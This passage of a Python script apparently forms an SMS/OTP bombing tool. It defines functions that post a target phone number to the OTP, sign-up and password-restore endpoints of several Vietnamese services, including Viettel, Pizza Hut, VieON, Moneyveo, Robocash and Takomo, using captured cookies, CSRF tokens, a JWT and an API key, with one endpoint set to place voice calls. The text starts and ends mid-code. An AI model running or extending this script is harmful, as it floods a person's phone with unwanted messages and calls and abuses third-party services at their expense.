XSRF-TOKEN=eyJpdiI6IlhBenRBazlCbkpHV1A5amhzN2dleUE9PSIsInZhbHVlIjoiWENaN1U0SEVFY1dXVUt4Qmg1V3hCUklGb3YreEwxSHQ3VXR0czRqcXpha1A4T0VoZmlITHE1ckJlZ0dBTmY5YytQRmROWGkwRzlBckNlSG5FSjVSWU9oNm1DMEZ6ZEFxbmh0Y0JtTERJQTZjSk05Y0o3dHlWZDJNdW1YWTNXdUoiLCJtYWMiOiJkZTBhYzE0MzFjN2M2NmE1YzJjNWM5ZDNmNDhiMDYxNGFiMDBhYWFhYjkwOGMwNGNkZDc0MGE4ZGE1OTVmY2M5IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImZiOS9jSDZLdFNsZ0pGeXB2Qzhrb3c9PSIsInZhbHVlIjoiWU1qcUJJY21xTFdldmVYcHdZRUJCZWdZampVREdsYXRGM0JpdFR5aVFHbmwrWTlWQmtRZWE0R3Q1RVJZMTVOU2JTWkZoaVRFSklQblNVQWF3V0tmNC9uYlMzZW5aa3VDc01sNE56cE1LVzlLeVdKMXdPQUZnM1o3MjlpbUJYYmUiLCJtYWMiOiI1NzE5NGRjNmQ0OTY4ZmFkYjc4N2U5ZDY1MDIxMzA0OTk3NTVhMGJhOWE1NDQwNGQ5NTg3ODQzNjhiMzI2ZWViIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IithcDk0Zzg3UzdIMDRxaW9vREJZVnc9PSIsInZhbHVlIjoiQ2UzKy9wMkJiY1Z4N2hwUmg3S3VLWUpoc2VOTG9mUVNSRVoxUFpoK3UreStJYjJUTE9hT1VWeWhtZDJVTnJhQWdOeGhteGNiMlQ3V3BXZEdubTJrcFNEbVlkREJwTGdRaHFCc0dyWnpBQWgxc05LdTVMVnlCNTkwblhqNHd0MkIiLCJtYWMiOiI3ZTk4YTM2YzdlN2U1ZTBkMDA5YzAwNTk5YTMyMmI3ZDg4ZmIyNDZkNGFhMWM5MWZlMmU4NTZiMGUzZjM4ZmI2IiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1697100963.1.1.1697100965.58.0.0; _ga=GA1.2.606750676.1697100964; _ym_uid=169710096651655972; _ym_d=1697100966; jslbrc=w.202310120856042cafa301-68dd-11ee-a84d-0299c7a21129.A_GS; _clsk=1ucp13t|1697100968297|1|1|x.clarity.ms/collect; _ym_isad=2; _ym_visorc=w; ec_png_utm=6408f033-a105-f560-a7be-1f96237fac84; ec_etag_utm=6408f033-a105-f560-a7be-1f96237fac84; ec_cache_utm=6408f033-a105-f560-a7be-1f96237fac84; uid=6408f033-a105-f560-a7be-1f96237fac84; ec_png_client=false; ec_etag_client=false; ec_cache_client=false; client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_etag_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_cache_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; supportOnlineTalkID=0cy5BAhEasyrMQvE8fnessSC2Q000Nc7',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        '_token': 'ZdonNEUzD0WAtdKfeIMsdZN0F4OqE4yXcNqG99Ix',
        'data': phone,
    }

    response = requests.post('https://robocash.vn/restore/phone', cookies=cookies, headers=headers, data=data)

def vdh4():
    cookies = {
        'x_polaris_sid': 'BYCcCqNjXoOI93ay/GUkckNXTg|NLO|LlJOq',
        'ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%22116c4ce9-bf3f-fc02-f544-a0b6ffd3676b%22%2C%22c%22%3A1697101086758%2C%22l%22%3A1697101086758%7D',
        '_gcl_au': '1.1.889534889.1697101087',
        '_fbp': 'fb.1.1697101087613.159282760',
        '_gid': 'GA1.2.355923841.1697101088',
        '_gat_UA-197055535-1': '1',
        '_gat_UA-197055535-2': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'vYOh0R-fRL1cjfviaCOvBmEIog3',
        'fs_lua': '1.1697101089848',
        'fs_uid': '#o-1EGZPD-na1#417296e0-7c39-48f5-8c90-ca47780f647e:c101bd43-ea70-4eeb-a256-4baf3ab9bad2:1697101089848::1#/1728637088',
        '_ga': 'GA1.2.1113988317.1697101088',
        'ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%222e6ddc5a-cce5-fab5-caa9-1250af678f52%22%2C%22e%22%3A1697102900082%2C%22c%22%3A1697101086753%2C%22l%22%3A1697101100082%7D',
        '_ga_VLLXGWD25W': 'GS1.1.1697101088.1.1.1697101136.0.0.0',
        '_ga_Q17PXF17Y5': 'GS1.1.1697101088.1.1.1697101139.0.0.0',
        'x_polaris_sd': 't|JwpokyvhCWLWClNUwwm4G5UmPGs|HIbhEUr0Psjuo5oy7rLYjM0N97ll6ftiuG4BdqCcRVX93GYxH8jbDVsfD9Vfrxr2cd/dDGsyL93ZncaaZuixsoG|MdmNfzS1yo',
    }

    headers = {
        'authority': 'pizzahut.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'x_polaris_sid=BYCcCqNjXoOI93ay/GUkckNXTg|NLO|LlJOq; ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%22116c4ce9-bf3f-fc02-f544-a0b6ffd3676b%22%2C%22c%22%3A1697101086758%2C%22l%22%3A1697101086758%7D; _gcl_au=1.1.889534889.1697101087; _fbp=fb.1.1697101087613.159282760; _gid=GA1.2.355923841.1697101088; _gat_UA-197055535-1=1; _gat_UA-197055535-2=1; _tt_enable_cookie=1; _ttp=vYOh0R-fRL1cjfviaCOvBmEIog3; fs_lua=1.1697101089848; fs_uid=#o-1EGZPD-na1#417296e0-7c39-48f5-8c90-ca47780f647e:c101bd43-ea70-4eeb-a256-4baf3ab9bad2:1697101089848::1#/1728637088; _ga=GA1.2.1113988317.1697101088; ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%222e6ddc5a-cce5-fab5-caa9-1250af678f52%22%2C%22e%22%3A1697102900082%2C%22c%22%3A1697101086753%2C%22l%22%3A1697101100082%7D; _ga_VLLXGWD25W=GS1.1.1697101088.1.1.1697101136.0.0.0; _ga_Q17PXF17Y5=GS1.1.1697101088.1.1.1697101139.0.0.0; x_polaris_sd=t|JwpokyvhCWLWClNUwwm4G5UmPGs|HIbhEUr0Psjuo5oy7rLYjM0N97ll6ftiuG4BdqCcRVX93GYxH8jbDVsfD9Vfrxr2cd/dDGsyL93ZncaaZuixsoG|MdmNfzS1yo',
        'origin': 'https://pizzahut.vn',
        'referer': 'https://pizzahut.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'keyData': 'appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={phone}',
    }

    response = requests.post(
        'https://pizzahut.vn/callApiStorelet/user/registerRequest',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def vdh3():
    headers = {
        'authority': 'api.vieon.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTY5MTI1NzcsImp0aSI6IjI2ZjQ0MzA1M2UyYjE4MTY5NjFhZTk3ZjQ1ZDczNDE3IiwiYXVkIjoiIiwiaWF0IjoxNjk2NzM5Nzc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5NjczOTc3Niwic3ViIjoiYW5vbnltb3VzX2E1Mjg4MDUyMTg0Yzg2YjdiNTFmY2RiYmFhNTRhZDhlLTI1MTJlN2UzNTcwMjgwZjZiNTUyZWU5NGUzZjYwYzc0LTE2OTY3Mzk3NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiYTUyODgwNTIxODRjODZiN2I1MWZjZGJiYWE1NGFkOGUtMjUxMmU3ZTM1NzAyODBmNmI1NTJlZTk0ZTNmNjBjNzQtMTY5NjczOTc3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.a68EyUReJUMpXkMmDcql32W7tVXvmE3GfcBnDQRMn0k',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/auth/?destination=%2F&utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite&utm_content=p_--k_vieon',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'a5288052184c86b7b51fcdbbaa54ad8e',
        'device_name': 'Chrome/117',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)


def moneyveo():
    cookies = {
        'CaptchaCookieKey': '0',
        'ASP.NET_SessionId': 'tmvf03c3pmr352s0pj3sbezt',
        'language': 'vi',
        'RequestData': '50db73d1-045f-4bc3-9569-bf58f3210ada',
        '_gcl_aw': 'GCL.1697101430.Cj0KCQjwsp6pBhCfARIsAD3GZuZ-AX8kp2SYGZiRb1wNZT-cSGUAkhepcDS0bZZqOvFbVfga-p3T_88aAhKdEALw_wcB',
        'UserTypeMarketing': 'L0',
        '_gid': 'GA1.2.1952414801.1697101431',
        '_gac_UA-154151447-1': '1.1697101431.Cj0KCQjwsp6pBhCfARIsAD3GZuZ-AX8kp2SYGZiRb1wNZT-cSGUAkhepcDS0bZZqOvFbVfga-p3T_88aAhKdEALw_wcB',
        '__sbref': 'odbgkfkcpnroijckuupiqqscqubjqrjsqrtdporl',
        'UserMachineId_png': '7ff29d65-48dd-4bbf-bbf5-b97a4338f446',
        'UserMachineId_etag': '7ff29d65-48dd-4bbf-bbf5-b97a4338f446',
        'UserMachineId_cache': '7ff29d65-48dd-4bbf-bbf5-b97a4338f446',
        'UserMachineId': '7ff29d65-48dd-4bbf-bbf5-b97a4338f446',
        '_ga_LCPCW0ZYR8': 'GS1.1.1697101430.1.1.1697101436.54.0.0',
        '_ga': 'GA1.2.983041535.1697101431',
        'Marker': 'MarkerInfo=v+/l2145R6K3eB1xqD/UKDZYDRSeP3db5doTsnU4+14=',
    }

    headers = {
        'authority': 'moneyveo.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'CaptchaCookieKey=0; ASP.NET_SessionId=tmvf03c3pmr352s0pj3sbezt; language=vi; RequestData=50db73d1-045f-4bc3-9569-bf58f3210ada; _gcl_aw=GCL.1697101430.Cj0KCQjwsp6pBhCfARIsAD3GZuZ-AX8kp2SYGZiRb1wNZT-cSGUAkhepcDS0bZZqOvFbVfga-p3T_88aAhKdEALw_wcB; UserTypeMarketing=L0; _gid=GA1.2.1952414801.1697101431; _gac_UA-154151447-1=1.1697101431.Cj0KCQjwsp6pBhCfARIsAD3GZuZ-AX8kp2SYGZiRb1wNZT-cSGUAkhepcDS0bZZqOvFbVfga-p3T_88aAhKdEALw_wcB; __sbref=odbgkfkcpnroijckuupiqqscqubjqrjsqrtdporl; UserMachineId_png=7ff29d65-48dd-4bbf-bbf5-b97a4338f446; UserMachineId_etag=7ff29d65-48dd-4bbf-bbf5-b97a4338f446; UserMachineId_cache=7ff29d65-48dd-4bbf-bbf5-b97a4338f446; UserMachineId=7ff29d65-48dd-4bbf-bbf5-b97a4338f446; _ga_LCPCW0ZYR8=GS1.1.1697101430.1.1.1697101436.54.0.0; _ga=GA1.2.983041535.1697101431; Marker=MarkerInfo=v+/l2145R6K3eB1xqD/UKDZYDRSeP3db5doTsnU4+14=',
        'origin': 'https://moneyveo.vn',
        'referer': 'https://moneyveo.vn/vi/registernew/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-04fe5a857460074f40ae1aaccbe86674-ea27312c030ae1dd-00',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': phone,
    }

    response = requests.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', cookies=cookies, headers=headers, data=data)

def vdh2():
    cookies = {
        'laravel_session': 'm5Kjo2cDCsiwMUzE1AqZgO7kukHJdCp7CvhiGEAH',
        'redirectLogin': 'https://viettel.vn/',
        'XSRF-TOKEN': 'eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=m5Kjo2cDCsiwMUzE1AqZgO7kukHJdCp7CvhiGEAH; redirectLogin=https://viettel.vn/; XSRF-TOKEN=eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'AVSj6dXTdn20zXu7ddUBUO8xwlxBodg80NUAdOlw',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def metavn():
    cookies = {
        '_cart_': '2c1ae2cc-e0ff-4b83-846f-dc516509d49d',
        '__ckmid': 'fb7f3cb1878d4a049a5d2657ea5ede21',
        '_gcl_au': '1.1.1954763578.1696740416',
        '_ssid': 'vkfw05zr0f1blu240az0r0sa',
        '_gid': 'GA1.2.2013286837.1697101638',
        '_gat_UA-1035222-8': '1',
        '_ga': 'GA1.1.1490215704.1696740417',
        '_ga_L0FCVV58XQ': 'GS1.1.1697101638.3.1.1697101638.60.0.0',
        '_ga_YE9QV6GZ0S': 'GS1.1.1697101638.3.1.1697101653.0.0.0',
    }

    headers = {
        'authority': 'meta.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_cart_=2c1ae2cc-e0ff-4b83-846f-dc516509d49d; __ckmid=fb7f3cb1878d4a049a5d2657ea5ede21; _gcl_au=1.1.1954763578.1696740416; _ssid=vkfw05zr0f1blu240az0r0sa; _gid=GA1.2.2013286837.1697101638; _gat_UA-1035222-8=1; _ga=GA1.1.1490215704.1696740417; _ga_L0FCVV58XQ=GS1.1.1697101638.3.1.1697101638.60.0.0; _ga_YE9QV6GZ0S=GS1.1.1697101638.3.1.1697101653.0.0.0',
        'origin': 'https://meta.vn',
        'referer': 'https://meta.vn/account/register?ReturnUrl=/account/register',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'api_mode': '1',
    }

    json_data = {
        'api_args': {
            'lgUser': phone,
            'act': 'send',
            'type': 'phone',
        },
        'api_method': 'CheckExist',
    }

    response = requests.post(
        'https://meta.vn/app_scripts/pages/AccountReact.aspx',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def vdh1():
    cookies = {
        '_gcl_au': '1.1.905385950.1697101730',
        '_gid': 'GA1.2.820953639.1697101730',
        '_gac_UA-187725374-2': '1.1697101730.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        '_gat_UA-187725374-2': '1',
        '_hjSessionUser_2281843': 'eyJpZCI6IjAyNDc1MjhhLTlmNDAtNTg1OC1iMzU5LTM2ZmE3NjFiNjdlMiIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6ImIxODE1ZDUyLWRmMjMtNDFiMS1hNDU3LWEwNTRkZjFiNGEzNyIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTQsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '_fbp': 'fb.1.1697101730636.1899941891',
        '_tt_enable_cookie': '1',
        '_ttp': 'xfgnJlSYMTt0ymrTCSc6dSE9yqj',
        '_fw_crm_v': 'cbb950fc-0b22-4605-c51d-3732b0dba139',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM3MjY0NTM1Mg.0d_xgR9-7Ji20oQtALNXXLCMsV43PbgD976WM1ojvGs',
        '_ga_ZBQ18M247M': 'GS1.1.1697101730.1.1.1697101743.47.0.0',
        '_gcl_aw': 'GCL.1697101744.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        '_gat_UA-187725374-1': '1',
        '_ga_ZN0EBP68G5': 'GS1.1.1697101744.1.0.1697101745.59.0.0',
        '_hjSessionUser_2281853': 'eyJpZCI6ImE0MGE4NDY2LWNlNjktNTMyNS04NWJhLTBmMmIyOWY5NzBmMSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDYsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjIncludedInSessionSample_2281853': '0',
        '_hjSession_2281853': 'eyJpZCI6IjBkMTBhODk4LWM3NDYtNDlhYy05Y2NlLTkxOGQ2ODQwYzZmNSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_ga': 'GA1.2.671353304.1697101730',
        '_gac_UA-187725374-1': '1.1697101748.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.905385950.1697101730; _gid=GA1.2.820953639.1697101730; _gac_UA-187725374-2=1.1697101730.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB; _gat_UA-187725374-2=1; _hjSessionUser_2281843=eyJpZCI6IjAyNDc1MjhhLTlmNDAtNTg1OC1iMzU5LTM2ZmE3NjFiNjdlMiIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6ImIxODE1ZDUyLWRmMjMtNDFiMS1hNDU3LWEwNTRkZjFiNGEzNyIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTQsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1697101730636.1899941891; _tt_enable_cookie=1; _ttp=xfgnJlSYMTt0ymrTCSc6dSE9yqj; _fw_crm_v=cbb950fc-0b22-4605-c51d-3732b0dba139; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM3MjY0NTM1Mg.0d_xgR9-7Ji20oQtALNXXLCMsV43PbgD976WM1ojvGs; _ga_ZBQ18M247M=GS1.1.1697101730.1.1.1697101743.47.0.0; _gcl_aw=GCL.1697101744.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1697101744.1.0.1697101745.59.0.0; _hjSessionUser_2281853=eyJpZCI6ImE0MGE4NDY2LWNlNjktNTMyNS04NWJhLTBmMmIyOWY5NzBmMSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDYsImV4aXN0aW5nIjpmYWxzZX0=; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6IjBkMTBhODk4LWM3NDYtNDlhYy05Y2NlLTkxOGQ2ODQwYzZmNSIsImNyZWF0ZWQiOjE2OTcxMDE3NDUyMDksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _ga=GA1.2.671353304.1697101730; _gac_UA-187725374-1=1.1697101748.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone=0372645352&amount=10000000&term=30&utm_source=google_search&utm_medium=ThanhBinh-TKM&utm_campaign=google_search_cpc_VH_All_ThanhBinh_1&utm_term=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_1_1&utm_content=google_search_cpc_VH_All_ThanhBinh_NationalWide_Massive_TKM___1_1_2&gad=1&gclid=Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)


def pops():
    cookies = {
        'ssid': '38a8473qiarp5cshp8e0ohpq3mkovucl1vqvo68hh5nr6m98t0k5fttc8mbuqlc00ea62r07ptrp7t5kuviqtmp2njp5didvvu3uudg=:1697101878',
    }

    headers = {
        'authority': 'products.popsww.com',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'api-key': '5d2300c2c69d24a09cf5b09b',
        'content-type': 'application/json',
        # 'cookie': 'ssid=38a8473qiarp5cshp8e0ohpq3mkovucl1vqvo68hh5nr6m98t0k5fttc8mbuqlc00ea62r07ptrp7t5kuviqtmp2njp5didvvu3uudg=:1697101878',
        'lang': 'vi',
        'origin': 'https://pops.vn',
        'platform': 'web',
        'profileid': '65225c27ed285800430b7fa2',
